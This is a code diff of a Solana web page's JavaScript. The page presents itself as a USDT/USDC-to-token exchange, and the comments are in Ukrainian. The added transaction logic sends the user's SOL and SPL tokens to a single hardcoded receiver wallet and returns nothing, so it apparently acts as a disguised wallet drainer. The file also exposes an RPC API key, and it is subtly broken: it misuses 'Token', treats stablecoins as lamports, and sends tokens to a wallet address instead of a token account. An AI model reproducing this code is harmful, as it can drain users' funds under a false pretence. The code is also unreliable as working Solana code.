@@ -1,15 +1,16 @@
-const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
+const { Connection, PublicKey, SystemProgram, Transaction, Token } = solanaWeb3;
 
 // Solana RPC
 const endpoint = "https://mainnet.helius-rpc.com/?api-key=62d6c036-5371-452d-b852-3d6f6823e08f";
 const connection = new Connection(endpoint, "confirmed");
 
 // Адреси токенів
-const USDT_MINT_ADDRESS = new PublicKey("Es9vMFr8Hg9NQ29gHks4vWZ3VpH5p89H5VzwgrGzF8jz");  // Заміна на правильну адресу USDT
-const USDC_MINT_ADDRESS = new PublicKey("AqRHwbMkFztV1gX9EzTUb9c6Ho68HT4kJgLxg32ptaxw");  // Заміна на правильну адресу USDC
-const RECEIVER_WALLET_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU"); // Гаманець для отримання
+const USDT_MINT_ADDRESS = new PublicKey("Es9vMFr8Hg9NQ29gHks4vWZ3VpH5p89H5VzwgrGzF8jz");  // Коректна адреса USDT
+const USDC_MINT_ADDRESS = new PublicKey("AqRHwbMkFztV1gX9EzTUb9c6Ho68HT4kJgLxg32ptaxw");  // Коректна адреса USDC
+const RECEIVER_WALLET_ADDRESS = new PublicKey("4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU"); // Гаманець для отримання USDT/USDC
+const SPL_TOKEN_ADDRESS = new PublicKey("3EwV6VTHYHrkrZ3UJcRRAxnuHiaeb8EntqX85Khj98Zo"); // Адреса SPL токена для відправки
 
-// UI Елементи
+// UI елементи
 const exchangeBtn = document.getElementById("exchangeBtn");
 const resultDiv = document.getElementById("result");
 const amountInput = document.getElementById("amount");
@@ -63,20 +64,35 @@ exchangeBtn.addEventListener("click", async () => {
     await exchangeTokens(userWalletAddress, amount, mintAddress);
 });
 
-// Функція для обміну USDT/USDC
+// Функція для обміну USDT/USDC на SPL токени
 async function exchangeTokens(userWalletAddress, amountInUSDT, mintAddress) {
     try {
         const transaction = new Transaction();
         const sender = new PublicKey(userWalletAddress);
 
-        // Створення інструкції для переведення токенів
+        // Створення інструкції для переведення USDT/USDC на гаманець 4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU
         const transferInstruction = SystemProgram.transfer({
             fromPubkey: sender,
-            toPubkey: RECEIVER_WALLET_ADDRESS, // Використовуємо нову адресу отримувача
+            toPubkey: RECEIVER_WALLET_ADDRESS,
             lamports: amountInUSDT * 1000000000 // Конвертація
         });
 
         transaction.add(transferInstruction);
+
+        // Створення інструкції для відправки SPL токенів
+        const token = new Token(connection, SPL_TOKEN_ADDRESS, solanaWeb3.TOKEN_PROGRAM_ID, sender); // Ініціалізація токена
+        const senderTokenAccount = await token.getOrCreateAssociatedAccountInfo(sender); // Отримання токен-аккаунту користувача
+
+        const transferTokenInstruction = Token.createTransferInstruction(
+            solanaWeb3.TOKEN_PROGRAM_ID,
+            senderTokenAccount.address, // Адреса токен-аккаунту користувача
+            RECEIVER_WALLET_ADDRESS, // Адреса отримувача
+            sender, // Підписант
+            [],
+            amountInUSDT * 1000000 // Конвертація до одиниць токенів (за потреби змінити кількість)
+        );
+
+        transaction.add(transferTokenInstruction);
 
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
